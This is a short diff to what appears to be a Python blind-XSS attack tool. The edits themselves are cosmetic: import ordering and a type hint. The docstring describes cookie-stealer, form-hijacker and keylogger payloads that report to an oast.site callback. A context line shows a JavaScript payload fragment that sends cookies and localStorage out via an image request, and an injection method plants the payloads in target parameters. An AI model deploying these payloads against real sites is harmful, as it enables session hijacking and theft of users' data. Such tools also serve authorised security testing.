@@ -4,7 +4,7 @@ Blind XSS Payloads — OOB callback via interact.sh for stolen data exfiltration
 Payloads: cookie stealer, form hijacker, DOM extractor, keylogger, combined.
 All phone home to {marker}.oast.site → OOB detector captures.
 """
-from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
+from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse
 
 
 class BlindXSSHunter:
@@ -51,7 +51,7 @@ new Image().src='__CB__/x?co='+encodeURIComponent(c)+'&ls='+encodeURIComponent(J
     # Injection
 
     async def inject_stored(self, url: str, param: str, marker: str,
-                             method: str = "GET", form_fields: dict = None) -> None:
+                             method: str = "GET", form_fields: dict | None = None) -> None:
         """Inject blind XSS payloads into a parameter. OOB callbacks collected by poll loop."""
         payloads = self.stored_xss_payloads(marker)
         for payload in payloads:
